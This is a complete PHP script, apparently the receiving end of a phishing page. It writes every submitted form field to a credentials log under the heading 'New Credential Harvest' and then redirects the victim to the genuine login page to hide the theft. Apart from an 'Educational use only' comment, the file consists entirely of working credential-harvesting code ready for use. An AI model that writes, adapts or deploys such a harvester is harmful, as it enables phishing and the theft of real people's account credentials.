<?php
// Educational use only
$file = '../logs/credentials.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $post_data = $_POST;
    $log_entry = "--- New Credential Harvest ---\n";
    foreach ($post_data as $key => $value) {
        $log_entry .= "$key: $value\n";
    }
    $log_entry .= "Timestamp: " . date("Y-m-d H:i:s") . "\n\n";

    file_put_contents($file, $log_entry, FILE_APPEND | LOCK_EX);

    // Redirect to real site after capturing
    header("Location: https://example.com/login");
    exit();
}
?>

